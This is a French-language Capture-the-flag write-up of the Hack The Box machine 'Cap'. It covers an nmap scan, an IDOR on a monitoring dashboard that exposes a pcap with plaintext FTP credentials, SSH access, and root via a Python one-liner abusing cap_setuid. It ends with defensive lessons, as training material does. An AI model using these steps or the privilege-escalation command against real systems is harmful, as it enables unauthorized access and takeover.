# HTB — CAP Write-up

- **Machine :** Cap
- **Plateforme :** Hack The Box
- **OS :** Linux
- **Difficulté :** Easy
- **IP :** 10.10.10.245

---

## Résumé

Cap est une machine Linux dont le vecteur d'entrée est une **IDOR** (Insecure Direct Object Reference) sur une interface web de monitoring réseau. En modifiant un simple identifiant dans l'URL, on récupère une capture réseau (`.pcap`) contenant des identifiants FTP/SSH en clair. La privesc se fait via une **capability Linux** (`cap_setuid`) positionnée sur le binaire Python.

---

## 1. Reconnaissance

### Scan Nmap

```bash
nmap -sC -sV 10.10.10.245
```

**Résultat — 3 ports TCP ouverts :**

| Port | Service |
|------|---------|
| 21   | FTP     |
| 22   | SSH     |
| 80   | HTTP    |

Le port 80 héberge un dashboard de sécurité réseau (type interface d'admin/monitoring).

---

## 2. Énumération web & IDOR

L'application propose des captures réseau par utilisateur via des URLs du type :

```
http://10.10.10.245/data/<id>
```

### Observation

```
URL : http://10.10.10.245/data/2   =>  affiche des données de session
```

Le `<id>` est **directement manipulable**. C'est le point clé : rien ne vérifie que la capture demandée nous appartient.

### Exploitation de l'IDOR

En descendant l'ID jusqu'à `0`, on tombe sur la capture qui correspond souvent à une session admin/initiale :

```
URL : http://10.10.10.245/data/0
```

On télécharge le fichier `.pcap` associé (bouton "Download" → ouverture dans **Wireshark**).

> **Pourquoi ça marche :** l'IDOR est une faille d'autorisation, pas d'authentification. L'appli t'authentifie bien, mais ne vérifie pas tes *droits* sur la ressource demandée. Toujours tester l'incrémentation/décrémentation d'identifiants exposés.

---

## 3. Analyse du PCAP (Wireshark)

Le `.pcap` de `/data/0` contient un login **en clair**. FTP (et un login réutilisable en SSH) transmet les identifiants sans chiffrement.

```
Follow TCP Stream  =>  identifiants capturés
```

**Credentials récupérés :**

```
user     : nathan
password : Buck3H4TF0RM3!
```

> **Filtre utile dans Wireshark :** `ftp` ou `ftp.request.command == "PASS"` pour isoler l'échange d'authentification. Clic droit sur un paquet → *Follow → TCP Stream*.

---

## 4. Accès initial (foothold)

Les creds fonctionnent en SSH :

```bash
ssh nathan@10.10.10.245
# password : Buck3H4TF0RM3!
```

> *Note : si tu disposes d'une clé privée, la syntaxe serait `ssh -i /path/to/private_key nathan@10.10.10.245`. Ici l'accès se fait par mot de passe récupéré dans le pcap.*

### Flag user

```bash
cat user.txt
```

---

## 5. Élévation de privilèges

### Énumération des capabilities

```bash
getcap -r / 2>/dev/null
```

**Résultat :**

```
/usr/bin/python3.8 = cap_setuid+ep
```

Le binaire `python3.8` possède la capability **`cap_setuid`**, ce qui lui permet de changer d'UID sans être SUID root classique.

### Exploitation

On force l'UID à `0` (root) puis on lance un shell :

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

> **Pourquoi ça marche :** `cap_setuid` autorise l'appel `setuid(0)`. Une fois l'UID à 0, tout processus enfant (`/bin/bash`) hérite des privilèges root. C'est plus fin qu'un SUID complet, mais tout aussi dangereux mal configuré. Réflexe à avoir : `getcap -r /` fait partie de tout checklist de privesc Linux (cf. GTFOBins → python → Capabilities).

### Root

```bash
id
# uid=0(root) ...
cd /root
cat root.txt
```

---

## Chaîne d'attaque (récap)

```
Nmap (21,22,80)
   └─> Web dashboard
        └─> IDOR sur /data/<id>  (id=0)
             └─> Download .pcap
                  └─> Wireshark : creds nathan en clair
                       └─> SSH foothold + user.txt
                            └─> getcap : python3.8 cap_setuid
                                 └─> os.setuid(0) → root + root.txt
```

---

## Leçons / points de sécu

- **IDOR** : ne jamais faire confiance à un identifiant côté client ; contrôler l'autorisation ressource par ressource.
- **Protocoles en clair** : FTP/HTTP transmettent les creds sans chiffrement → sniffables. Utiliser FTPS/SFTP/HTTPS.
- **Réutilisation de mots de passe** : le même secret servait pour FTP et SSH.
- **Linux capabilities** : aussi puissantes qu'un SUID root si mal posées. Auditer avec `getcap -r /`.

---

## Outils utilisés

`nmap` · navigateur web · `wireshark` · `ssh` · `getcap` · `python3.8`